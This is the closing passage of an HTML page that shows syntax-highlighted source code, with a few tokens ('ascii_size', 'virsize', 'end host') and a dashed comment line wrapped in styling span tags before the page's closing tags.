    </span><span class="sc5">ascii_size</span><span class="sc0"> </span><span class="sc5">virsize</span><span class="sc0">
</span><span class="sc1">;=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><span class="sc0">


</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">host</span></div></body>
</html>
